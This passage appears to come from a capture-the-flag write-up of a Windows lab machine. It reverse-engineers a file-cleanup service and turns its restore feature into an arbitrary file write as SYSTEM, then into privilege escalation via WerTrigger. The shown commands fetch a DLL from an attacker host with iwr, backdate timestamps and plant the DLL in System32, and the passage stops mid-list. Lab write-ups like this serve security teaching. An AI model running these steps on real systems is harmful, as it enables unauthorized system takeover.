+<p>Most of the others were <code class="language-plaintext highlighter-rouge">.sys</code> files, or executables that I could find online. It’s also unusual to see an executable sitting in <code class="language-plaintext highlighter-rouge">C:\program files</code> (usually it’s only folders). <code class="language-plaintext highlighter-rouge">nssm.exe</code> looks like the <a href="https://nssm.cc/">Non-Sucking Service Manager</a>. I don’t think this is interesting in it’s own right, but it does imply I should be looking at services</p>
+<p>There’s also an unfamiliar folder in <code class="language-plaintext highlighter-rouge">Program Files</code>, <code class="language-plaintext highlighter-rouge">Cleanup</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\program files&gt;</span><span class="n">ls</span><span class="w">
+</span><span class="go">
+    Directory: C:\program files
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----
+d-----       11/15/2020   4:05 AM                Cleanup
+d-----       11/14/2020   3:00 AM                Common Files
+d-----       11/14/2020   3:25 AM                internet explorer
+d-----         1/2/2021   9:13 AM                MariaDB 10.5
+d-----       11/14/2020   9:21 AM                Microsoft
+d-----       11/14/2020   9:28 AM                PHP
+d-----       11/14/2020   9:28 AM                Reference Assemblies
+d-----       11/14/2020   9:27 AM                runphp
+d-----        1/29/2021  12:41 PM                VMware
+d-r---        1/17/2021   7:20 AM                Windows Defender
+d-----        1/17/2021   7:20 AM                Windows Defender Advanced Threat Protection
+d-----        9/15/2018  12:19 AM                Windows Mail
+d-----        1/17/2021   7:20 AM                Windows Media Player
+d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
+d-----        9/15/2018  12:28 AM                windows nt
+d-----        1/17/2021   7:20 AM                Windows Photo Viewer
+d-----        9/15/2018  12:19 AM                Windows Portable Devices
+d-----        9/15/2018  12:19 AM                Windows Security
+d-----        9/15/2018  12:19 AM                WindowsPowerShell
+-a----        4/26/2017   7:14 AM         368640 nssm.exe  
+</span></code></pre></div></div>
+<p>In that directory are three files:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\program files\cleanup&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w">
+</span><span class="go">
+    Directory: C:\program files\cleanup
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       11/15/2020   4:03 AM        2999808 client.exe
+-a----       11/15/2020   9:22 AM            174 README.md
+-a----       11/15/2020   5:20 AM        3041792 server.exe
+
+</span><span class="gp">PS C:\program files\cleanup&gt;</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="nx">README.md</span><span class="w">
+</span><span class="c"># Cleanup
+</span><span class="go">
+We find the garbage on your system and delete it!
+
+</span><span class="c">## Changelog
+</span><span class="go">
+- 31.10.2020 - Alpha Release
+
+</span><span class="c">## Todo
+</span><span class="go">
+- Create an awesome GUI
+- Check additional paths
+</span></code></pre></div></div>
+<p>I don’t have the ability to list services:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\program files\cleanup&gt;</span><span class="w"> </span><span class="n">net</span><span class="w"> </span><span class="nx">start</span><span class="w">
+</span><span class="go">System error 5 has occurred.
+
+Access is denied.
+
+</span><span class="gp">PS C:\program files\cleanup&gt;</span><span class="w">  </span><span class="n">get-service</span><span class="w">
+</span><span class="go">get-service : Cannot open Service Control Manager on computer '.'. This operation might require other privileges.
+At line:1 char:1
++ get-service
++ ~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Get-Service], InvalidOperationException
+    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.PowerShell.Commands.GetServiceCommand
+</span></code></pre></div></div>
+<p>But I can go into the registry and look for service keys that include <code class="language-plaintext highlighter-rouge">cleanup</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\program files\cleanup&gt;</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="nx">hklm:\system\CurrentControlSet\services\</span><span class="w">
+</span><span class="gp">PS HKLM:\system\CurrentControlSet\services\&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">cleanup</span><span class="w">
+</span><span class="go">cleanup                        Type                             : 16
+                               DisplayName                      : Cleanup
+                               Description                      : Cleanup service
+</span></code></pre></div></div>
+<p>There’s a service named Cleanup. And it runs the <code class="language-plaintext highlighter-rouge">server.exe</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS HKLM:\system\CurrentControlSet\services\&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="nx">cleanup</span><span class="w">
+</span><span class="go">
+
+    Hive: HKEY_LOCAL_MACHINE\system\CurrentControlSet\services\cleanup
+
+
+Name                           Property
+----                           --------
+Parameters                     Application   : C:\Program Files\Cleanup\server.exe
+                               AppParameters :
+                               AppDirectory  : C:\Program Files\Cleanup  
+</span></code></pre></div></div>
+<p>I’ll grab copies of <code class="language-plaintext highlighter-rouge">client.exe</code> and <code class="language-plaintext highlighter-rouge">server.exe</code> to test locally.</p>
+<h3 id="binary-analysis">Binary Analysis</h3>
+<h4 id="running-it">Running It</h4>
+<p><strong>It’s always important to run binaries from CTFs in a VM environment. This binary will delete files in the current user’s Downloads folder. Make sure you have a snapshot before starting</strong>.</p>
+<p>Trying to start the client without the server returns:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS &gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\client.exe</span><span class="w">
+</span><span class="go">Cleaning C:\Users\0xdf\Downloads
+Error connecting to named pipe cleanupPipe - open \\.\pipe\cleanupPipe: The system cannot find the file specified.
+</span></code></pre></div></div>
+<p>The two binaries are using named pipes to communicate (I’ll explore this more in <a href="#arbitrary-read">Beyond Root</a>). Also, it mentions that it’s trying to clean my <code class="language-plaintext highlighter-rouge">Downloads</code> folder. Double-clicking on the server pops an empty console windows. Now when I run the client, it looks like the connection eventually times out:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS &gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\client.exe</span><span class="w">
+</span><span class="go">Cleaning C:\Users\0xdf\Downloads
+Error connecting to named pipe cleanupPipe - i/o timeout
+</span></code></pre></div></div>
+<p>Still, there’s output in the <code class="language-plaintext highlighter-rouge">server.exe</code> window:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CLEAN C:\Users\0xdf\Downloads\7z1900-x64.msi
+CLEAN C:\Users\0xdf\Downloads\AutoIt_Debugger_Setup_v0.47.0.exe
+CLEAN C:\Users\0xdf\Downloads\Bochs-win64-2.6.11.exe
+CLEAN C:\Users\0xdf\Downloads\ExploitCapcom-master.zip
+CLEAN C:\Users\0xdf\Downloads\ExplorerSuite.exe
+CLEAN C:\Users\0xdf\Downloads\PE.Explorer_setup.exe
+CLEAN C:\Users\0xdf\Downloads\Sc445.exe
+CLEAN C:\Users\0xdf\Downloads\SciTE4AutoIt3.exe
+CLEAN C:\Users\0xdf\Downloads\autoit-v3-setup.exe
+CLEAN C:\Users\0xdf\Downloads\desktop.ini
+CLEAN C:\Users\0xdf\Downloads\ghidra_9.1.2_PUBLIC_20200212.zip
+</code></pre></div></div>
+<p>There’s also now files in <code class="language-plaintext highlighter-rouge">C:\programdata\cleanup</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\ProgramData\Cleanup&gt;</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcN3oxOTAwLXg2NC5tc2k=
+QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcQXV0b0l0X0RlYnVnZ2VyX1NldHVwX3YwLjQ3LjAuZXhl
+QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcQm9jaHMtd2luNjQtMi42LjExLmV4ZQ==
+QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcRXhwbG9pdENhcGNvbS1tYXN0ZXIuemlw
+QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcRXhwbG9yZXJTdWl0ZS5leGU=
+QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcU2M0NDUuZXhl
+QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcU2NpVEU0QXV0b0l0My5leGU=
+QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcUEUuRXhwbG9yZXJfc2V0dXAuZXhl
+QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcYXV0b2l0LXYzLXNldHVwLmV4ZQ==
+QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcZ2hpZHJhXzkuMS4yX1BVQkxJQ18yMDIwMDIxMi56aXA=
+QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcZGVza3RvcC5pbmk=
+QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcaGV4aW5hdG9yLTY0LTEuMTIubXNp
+QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcamRrLTE1X3dpbmRvd3MteDY0X2Jpbi5leGU=
+</span></code></pre></div></div>
+<p>Those all decode to the path to the file that was removed:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcN3oxOTAwLXg2NC5tc2k=" | base64 -d
+C:\Users\0xdf\Downloads\7z1900-x64.msi
+</code></pre></div></div>
+<p>The files are just encrypted blobs of random data.</p>
+<p>One interesting thing - all of those files were already in my Downloads folder. When I tried to create a new file in <code class="language-plaintext highlighter-rouge">Downloads</code> and run <code class="language-plaintext highlighter-rouge">client.exe</code>, it doesn’t get cleaned up.</p>
+<h4 id="re">RE</h4>
+<p>The binary is written in Go, which makes it super difficult to reverse, for many reasons. One, it brings all it’s dependencies along, so they are in the binary and you’ll want to avoid reversing those. Additionally, there’s all kinds of weirdness with how things are handled. For example, strings are all lumped together into blobs, and not null terminated. Instead, a string object has two parts, a pointer to the string, and a int length.</p>
+<p>I’ll use both Ghidra and Ida (free) to take a look at things. The binary isn’t stripped, so it’s possible to find all the functions that start with <code class="language-plaintext highlighter-rouge">main</code>, which is where Go groups the main code. For example, in <code class="language-plaintext highlighter-rouge">client.exe</code>, Ghidra shows:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210301164917343.webp" type="image/webp"/>
+<img alt="image-20210301164917343" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210301164917343.png"/>
+</picture>
+<p>In <code class="language-plaintext highlighter-rouge">client.exe</code>, I went looking for the <code class="language-plaintext highlighter-rouge">Cleaning %s</code> string. It directed me here (Ida):</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210301164426380.webp" type="image/webp"/>
+<img alt="image-20210301164426380" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210301164426380.png"/>
+</picture>
+<p>It’s marked in red. What’s also interesting is the string <code class="language-plaintext highlighter-rouge">Restoring %s</code>, which indicates it has some capability to bring back the file it cleaned. That’s likely what I saw in <code class="language-plaintext highlighter-rouge">ProgramData</code>.</p>
+<p>There’s also functions for <code class="language-plaintext highlighter-rouge">serviceClean</code> and <code class="language-plaintext highlighter-rouge">serviceRestore</code>.</p>
+<p>Neither Ghidra nor Ida gave a great picture of how the binary worked, but I used <a href="https://x64dbg.com/#start">x64dbg</a> along with them to figure out what was going on. It helps to <a href="https://oalabs.openanalysis.net/2019/06/12/disable-aslr-for-easier-malware-debugging/">disable ASLR</a> in your reversing VM to easily map between the two.</p>
+<h4 id="arguments">Arguments</h4>
+<p>At the start of <code class="language-plaintext highlighter-rouge">main.main</code>, there’s some checking that turns out to be looking at passed in args. It sets two variables based on the results, which I’ve named <code class="language-plaintext highlighter-rouge">cmd_str_len</code> and <code class="language-plaintext highlighter-rouge">cmd_str</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210301201221954.webp" type="image/webp"/>
+<img alt="image-20210301201221954" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210301201221954.png"/>
+</picture>
+<p>The globals I’ve named <code class="language-plaintext highlighter-rouge">CLEAN</code> and <code class="language-plaintext highlighter-rouge">RESTORE</code> are in the middle of the giant ASCII blobs I showed above, and look like this in Ghidra:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210301201307388.webp" type="image/webp"/>
+<img alt="image-20210301201307388" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210301201307388.png"/>
+</picture>
+<p>There’s no null to terminate the string, which is why the length is stored in a variable. Similarly, when it goes to look at the second argument passed in, <code class="language-plaintext highlighter-rouge">ARGV+0x18</code> holds the length of that string, and <code class="language-plaintext highlighter-rouge">ARGV+0x10</code> holds the pointer to the string itself. This is weird having never reverse Go binaries before.</p>
+<p>Still, I can stumble through to realize that if there are 2 or more arguments, and the second arg has length 2 and a value <code class="language-plaintext highlighter-rouge">0x522d</code>, or <code class="language-plaintext highlighter-rouge">-R</code>, it will set that <code class="language-plaintext highlighter-rouge">cmd_str</code> to <code class="language-plaintext highlighter-rouge">RESTORE</code>, and otherwise to <code class="language-plaintext highlighter-rouge">CLEAN</code>.</p>
+<p>Some guessing around showed that it works if I pass in the original path to the file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\0xdf\Desktop&gt;</span>.<span class="se">\c</span>lient.exe <span class="nt">-R</span> C:<span class="se">\U</span>sers<span class="se">\0</span>xdf<span class="se">\D</span>ownloads<span class="se">\7</span>z1900-x64.msi
+<span class="go">Restoring C:\Users\0xdf\Downloads\7z1900-x64.msi
+</span></code></pre></div></div>
+<p>The file is back, and the corresponding base64-named file is no longer in <code class="language-plaintext highlighter-rouge">\programdata\cleanup</code>.</p>
+<h4 id="cleanup-criteria">Cleanup Criteria</h4>
+<p>There’s another important thing I learned debugging and jumping around this binary. In the <code class="language-plaintext highlighter-rouge">main.clean</code> function, it gets the current time with <code class="language-plaintext highlighter-rouge">time.now()</code>. It then enters a while loop, where it is looping over each file in the directory, eventually calling <code class="language-plaintext highlighter-rouge">os.Stat</code>. This returns information about the file. It does some conversions, eventually subtracting a time value from <code class="language-plaintext highlighter-rouge">os.Stat</code> from the value calculated using <code class="language-plaintext highlighter-rouge">time.now()</code>, and compares it to 0x278d00:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210301203006885.webp" type="image/webp"/>
+<img alt="image-20210301203006885" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210301203006885.png"/>
+</picture>
+<p>If the difference is less than 0x278d00, it doesn’t  call <code class="language-plaintext highlighter-rouge">main.serviceClean</code>.</p>
+
+\[0x278d00 = 2592000 = 30 _ 24 _ 60 * 60 = 30 days\]
+
+<p>So it is only moving files that are more than 30 days old.</p>
+<h3 id="arbitrary-write">Arbitrary Write</h3>
+<h4 id="local">Local</h4>
+<p>The original file is somehow encrypted and stored in <code class="language-plaintext highlighter-rouge">programdata</code>, with a name that is the base64 of the original name. I wondered what would happen if I changed that name?</p>
+<p>I created a dummy file, and set the timestamps back to the start of the year:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS &gt;</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">.</span><span class="nx">\Downloads\test.txt</span><span class="w">
+</span><span class="go">this is a test
+</span><span class="gp">PS &gt;</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Item</span><span class="w"> </span><span class="o">.</span><span class="nx">\Downloads\test.txt</span><span class="p">)</span><span class="o">.</span><span class="nf">LastWriteTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Date</span><span class="w"> </span><span class="s2">"1/1/2021 6:00 am"</span><span class="p">)</span><span class="w">
+</span><span class="gp">PS &gt;</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Item</span><span class="w"> </span><span class="o">.</span><span class="nx">\Downloads\test.txt</span><span class="p">)</span><span class="o">.</span><span class="nf">LastAccessTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Date</span><span class="w"> </span><span class="s2">"1/1/2021 6:00 am"</span><span class="p">)</span><span class="w">
+</span><span class="gp">PS &gt;</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Item</span><span class="w"> </span><span class="o">.</span><span class="nx">\Downloads\test.txt</span><span class="p">)</span><span class="o">.</span><span class="nf">CreationTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Date</span><span class="w"> </span><span class="s2">"1/1/2021 6:00 am"</span><span class="p">)</span><span class="w">
+</span><span class="gp">PS &gt;</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">.</span><span class="nx">\Downloads\</span><span class="w">
+</span><span class="go">
+
+    Directory: C:\Users\0xdf\Downloads
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          1/1/2021   6:00 AM             14 test.txt
+</span></code></pre></div></div>
+<p>I’ll clean it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS &gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\client.exe</span><span class="w">
+</span><span class="go">Cleaning C:\Users\0xdf\Downloads
+</span></code></pre></div></div>
+<p>It shows as cleaned in the server:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CLEAN C:\Users\0xdf\Downloads\test.txt
+</code></pre></div></div>
+<p>And the file is now in <code class="language-plaintext highlighter-rouge">programdata</code> as <code class="language-plaintext highlighter-rouge">QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcdGVzdC50eHQ=</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcdGVzdGZpbGUudHh0"</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+<span class="go">C:\Users\0xdf\Downloads\testfile.txt
+</span></code></pre></div></div>
+<p>I’ll create a new name (the <code class="language-plaintext highlighter-rouge">-n</code> is important, as the newline will otherwise be in the base64 and mess up the restoration):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\0</span><span class="s2">xdf</span><span class="se">\t</span><span class="s2">est.txt"</span> | <span class="nb">base64</span>
+<span class="go">QzpcVXNlcnNcMHhkZlx0ZXN0LnR4dA==
+</span></code></pre></div></div>
+<p>And copy the file to that name (in <code class="language-plaintext highlighter-rouge">C:\ProgramData\Cleanup</code>):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS &gt;</span><span class="w"> </span><span class="n">copy</span><span class="w"> </span><span class="nx">QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcdGVzdC50eHQ</span><span class="o">=</span><span class="w"> </span><span class="n">QzpcVXNlcnNcMHhkZlx0ZXN0LnR4dA</span><span class="o">==</span><span class="w">
+</span></code></pre></div></div>
+<p>On restoring, it exists in this new directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS &gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\client.exe</span><span class="w"> </span><span class="nt">-R</span><span class="w"> </span><span class="nx">C:\Users\0xdf\test.txt</span><span class="w">
+</span><span class="go">Restoring C:\Users\0xdf\test.txt
+</span><span class="gp">PS &gt;</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="nx">test.txt</span><span class="w">
+</span><span class="go">this is a test
+</span></code></pre></div></div>
+<p>I’m going to guess that the write occurs as the user running the <code class="language-plaintext highlighter-rouge">server.exe</code> process. On my machine, that’s just me (I could test by running it as another user on that VM), but on Proper, that’s likely System.</p>
+<h4 id="proper">Proper</h4>
+<p>I’ll try the same thing on Proper:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\web\Downloads&gt;</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="nx">test.txt</span><span class="w">
+</span><span class="go">0xdf was here
+</span><span class="gp">PS C:\Users\web\Downloads&gt;</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Item</span><span class="w"> </span><span class="nx">test.txt</span><span class="p">)</span><span class="o">.</span><span class="nf">LastWriteTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Date</span><span class="w"> </span><span class="s2">"1/1/2021 6:00 am"</span><span class="p">)</span><span class="w">
+</span><span class="gp">PS C:\Users\web\Downloads&gt;</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Item</span><span class="w"> </span><span class="nx">test.txt</span><span class="p">)</span><span class="o">.</span><span class="nf">LastaccessTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Date</span><span class="w"> </span><span class="s2">"1/1/2021 6:00 am"</span><span class="p">)</span><span class="w">
+</span><span class="gp">PS C:\Users\web\Downloads&gt;</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Item</span><span class="w"> </span><span class="nx">test.txt</span><span class="p">)</span><span class="o">.</span><span class="nf">creationTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Date</span><span class="w"> </span><span class="s2">"1/1/2021 6:00 am"</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+<p>Clean it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\web\Downloads&gt;</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="s2">"C:\program files\cleanup\client.exe"</span><span class="w">
+</span><span class="go">Cleaning C:\Users\web\Downloads
+</span></code></pre></div></div>
+<p>Create a filename:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"C:</span><span class="se">\w</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\0</span><span class="s2">xdf.txt"</span> | <span class="nb">base64</span>
+<span class="go">Qzpcd2luZG93c1xzeXN0ZW0zMlwweGRmLnR4dA==
+</span></code></pre></div></div>
+<p>Copy the backup into place:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\web\Downloads&gt;</span><span class="w"> </span><span class="n">copy</span><span class="w"> </span><span class="nx">\programdata\cleanup\QzpcVXNlcnNcd2ViXERvd25sb2Fkc1x0ZXN0LnR4dA</span><span class="o">==</span><span class="w"> </span><span class="n">\programdata\cleanup\Qzpcd2luZG93c1xzeXN0ZW0zMlwweGRmLnR4dA</span><span class="o">==</span><span class="w">
+</span></code></pre></div></div>
+<p>Restore:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\web\Downloads&gt;</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="s2">"C:\program files\cleanup\client.exe"</span><span class="w"> </span><span class="nt">-R</span><span class="w"> </span><span class="nx">C:\windows\system32\0xdf.txt</span><span class="w">
+</span><span class="go">Restoring C:\windows\system32\0xdf.txt
+</span><span class="gp">PS C:\Users\web\Downloads&gt;</span><span class="w"> </span><span class="kr">type</span><span class="w"> </span><span class="n">C:\windows\system32\0xdf.txt</span><span class="w">
+</span><span class="go">0xdf was here
+</span></code></pre></div></div>
+<p>That looks a lot like arbitrary write as SYSTEM.</p>
+<h3 id="shell-via-wertrigger">Shell via WerTrigger</h3>
+<h4 id="write-dll-to-system32">Write DLL to System32</h4>
+<p>Converting arbitrary write to shell on Windows is less trivial than on Linux, but still possible. <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---privileged-file-write">PayloadsAllTheThings has a section on it</a>. It mentions DiagHub (which I used back in <a href="/2019/07/06/htb-hackback.html#arbitrary-write--diaghub--system">HackBack</a>) as now patched, UsoDLLLoader (may be patched in some insider builds), and WerTrigger. I was able to get the <a href="https://github.com/sailay1996/WerTrigger">WerTrigger POC</a> to work.</p>
+<p>The way to exploit this is to write the <code class="language-plaintext highlighter-rouge">phoneinfo.dll</code> binary from the repo into <code class="language-plaintext highlighter-rouge">C:\Windows\System32</code> and then trigger it’s being run with the error reporting process.</p>
+<p>I’ll upload <code class="language-plaintext highlighter-rouge">phoneinfo.dll</code> to <code class="language-plaintext highlighter-rouge">Downloads</code> and update the timestamps:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\users\web\downloads&gt;</span><span class="w"> </span><span class="n">iwr</span><span class="w"> </span><span class="nx">http://10.10.14.10/phoneinfo.dll</span><span class="w"> </span><span class="nt">-outfile</span><span class="w"> </span><span class="nx">phoneinfo.dll</span><span class="w">
+</span><span class="gp">PS C:\users\web\downloads&gt;</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Item</span><span class="w"> </span><span class="nx">phoneinfo.dll</span><span class="p">)</span><span class="o">.</span><span class="nf">CreationTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Date</span><span class="w"> </span><span class="s2">"1/1/2021 6:00 am"</span><span class="p">)</span><span class="w">
+</span><span class="gp">PS C:\users\web\downloads&gt;</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Item</span><span class="w"> </span><span class="nx">phoneinfo.dll</span><span class="p">)</span><span class="o">.</span><span class="nf">LastAccessTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Date</span><span class="w"> </span><span class="s2">"1/1/2021 6:00 am"</span><span class="p">)</span><span class="w">
+</span><span class="gp">PS C:\users\web\downloads&gt;</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Item</span><span class="w"> </span><span class="nx">phoneinfo.dll</span><span class="p">)</span><span class="o">.</span><span class="nf">LastWriteTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Date</span><span class="w"> </span><span class="s2">"1/1/2021 6:00 am"</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+<p>Now run the cleaner:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\web\Downloads&gt;</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="s2">"C:\program files\cleanup\client.exe"</span><span class="w">
+</span><span class="go">Cleaning C:\Users\web\Downloads
+</span></code></pre></div></div>
+<p>I’ll need the new filename in <code class="language-plaintext highlighter-rouge">System32</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">ystem32</span><span class="se">\p</span><span class="s2">honeinfo.dll"</span> | <span class="nb">base64</span>
+<span class="go">QzpcV2luZG93c1xTeXN0ZW0zMlxwaG9uZWluZm8uZGxs
+</span></code></pre></div></div>
+<p>Use that to make the copy and then restore:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\programdata\cleanup&gt;</span><span class="w"> </span><span class="n">copy</span><span class="w"> </span><span class="nx">QzpcVXNlcnNcd2ViXERvd25sb2Fkc1xwaG9uZWluZm8uZGxs</span><span class="w"> </span><span class="nx">QzpcV2luZG93c1xTeXN0ZW0zMlxwaG9uZWluZm8uZGxs</span><span class="w"> 
+</span><span class="gp">PS C:\programdata\cleanup&gt;</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="s2">"C:\program files\cleanup\client.exe"</span><span class="w"> </span><span class="nt">-R</span><span class="w"> </span><span class="nx">C:\Windows\System32\phoneinfo.dll</span><span class="w">
+</span><span class="go">Restoring C:\Windows\System32\phoneinfo.dll
+</span></code></pre></div></div>
+<p>I’ve just written a dll into <code class="language-plaintext highlighter-rouge">System32</code> that will be used when the windows error reporting program runs.</p>
+<h4 id="trigger-wer-exploit">Trigger WER Exploit</h4>
+<p>The GitHub repo has a binary that triggers the backdoor. The <a href="https://github.com/sailay1996/WerTrigger/blob/master/src/WerTrigger/WerTrigger/WerTrigger.cpp">source</a> shows it does the following tasks:</p>
+<ul>
+<li>Creates a directory, <code class="language-plaintext highlighter-rouge">c:\programdata\microsoft\windows\wer\reportqueue\a_b_c_d_e</code></li>
+<li>Copies the <code class="language-plaintext highlighter-rouge">REport.wer</code> to <code class="language-plaintext highlighter-rouge">c:\programdata\microsoft\windows\wer\reportqueue\a_b_c_d_e\\Report.wer</code></li>
